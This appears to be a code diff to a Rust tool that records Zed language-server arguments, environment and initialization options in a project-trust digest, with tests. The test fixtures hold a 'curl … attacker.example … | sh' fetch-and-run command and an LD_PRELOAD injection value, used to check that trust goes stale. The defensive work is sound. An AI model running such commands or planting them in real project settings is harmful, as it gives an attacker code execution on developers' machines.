@@ -838,6 +838,41 @@ fn executable_path_privileges(value: &serde_json::Value, source: &str) -> Reposi
         ask.executable_paths.push(path.to_string());
         ask.settings.push(PrivilegedSetting::new(key, path, source));
     }
+
+    // The command line, the environment and the initialization options each
+    // reach a process. `binary.path = /bin/sh` reads as harmless on its own
+    // line; `arguments = ["-c", "curl … | sh"]` is the setting. Without these
+    // in the digest, a project trusted once stays trusted while the payload is
+    // rewritten. They are recorded for the digest alone: the Zed extension
+    // ignores `binary.path` and `binary.arguments` outright, and nothing here
+    // puts them into `AlConfig`.
+    for (key, pointer) in [
+        (
+            "lsp.al-lsp.binary.arguments",
+            "/lsp/al-lsp/binary/arguments",
+        ),
+        ("lsp.al-lsp.binary.env", "/lsp/al-lsp/binary/env"),
+        (
+            "lsp.al-lsp.initialization_options",
+            "/lsp/al-lsp/initialization_options",
+        ),
+    ] {
+        let Some(json) = value.pointer(pointer) else {
+            continue;
+        };
+        if json.is_null() {
+            continue;
+        }
+        // Compact JSON, so a value of any shape renders one way and two
+        // different values never render the same.
+        let rendered = serde_json::to_string(json).unwrap_or_default();
+        if rendered.is_empty() || rendered == "{}" || rendered == "[]" {
+            continue;
+        }
+        ask.settings
+            .push(PrivilegedSetting::new(key, &rendered, source));
+    }
+
     ask
 }
 
@@ -1215,6 +1250,77 @@ mod tests {
         let literal = PrivilegedSetting::new("al.codeAnalyzers", "a\\nb", ".vscode/settings.json");
         assert_eq!(newline.display_line(), literal.display_line());
         assert_ne!(digest_of(&[newline]), digest_of(&[literal]));
+    }
+
+    /// `binary.path = /bin/sh` reads as harmless on the line the user is shown.
+    /// The arguments are the setting, so trust granted over the path must go
+    /// stale when they change.
+    #[test]
+    fn the_language_server_command_line_is_in_the_digest() {
+        let _config = ScratchConfig::new();
+        let project = tempfile::tempdir().unwrap();
+        std::fs::create_dir_all(project.path().join(".zed")).unwrap();
+        std::fs::write(project.path().join("app.json"), "{}").unwrap();
+        let settings = project.path().join(".zed/settings.json");
+
+        let write = |arguments: &str| {
+            std::fs::write(
+                &settings,
+                format!(
+                    r#"{{"lsp":{{"al-lsp":{{"binary":{{"path":"/bin/sh","arguments":{arguments}}}}}}}}}"#
+                ),
+            )
+            .unwrap();
+            decide(project.path()).unwrap()
+        };
+
+        let first = write(r#"["-c","curl -s https://attacker.example/p | sh"]"#);
+        assert!(
+            first
+                .privileged
+                .iter()
+                .any(|setting| setting.key == "lsp.al-lsp.binary.arguments"),
+            "the arguments must be named among the privileged settings: {:?}",
+            first.privileged
+        );
+        trust_project(&first.root, &first.digest).unwrap();
+        assert!(decide(project.path()).unwrap().is_trusted());
+
+        let second = write(r#"["-c","echo something-else > /tmp/marker"]"#);
+        assert_ne!(
+            first.digest, second.digest,
+            "rewriting the command line must change the digest"
+        );
+        assert_eq!(second.state, TrustState::Stale);
+    }
+
+    /// `binary.env` and `initialization_options` reach a process too, and the
+    /// extension API may start exposing them.
+    #[test]
+    fn the_other_zed_keys_that_reach_a_process_are_in_the_digest() {
+        let _config = ScratchConfig::new();
+        let project = tempfile::tempdir().unwrap();
+        std::fs::create_dir_all(project.path().join(".zed")).unwrap();
+        std::fs::write(project.path().join("app.json"), "{}").unwrap();
+        std::fs::write(
+            project.path().join(".zed/settings.json"),
+            r#"{"lsp":{"al-lsp":{"binary":{"env":{"LD_PRELOAD":"./x.so"}},
+               "initialization_options":{"al":{"codeAnalyzers":["./p.dll"]}}}}}"#,
+        )
+        .unwrap();
+
+        let decision = decide(project.path()).unwrap();
+        let keys: Vec<&str> = decision
+            .privileged
+            .iter()
+            .map(|setting| setting.key.as_str())
+            .collect();
+
+        assert!(keys.contains(&"lsp.al-lsp.binary.env"), "{keys:?}");
+        assert!(
+            keys.contains(&"lsp.al-lsp.initialization_options"),
+            "{keys:?}"
+        );
     }
 
     #[test]
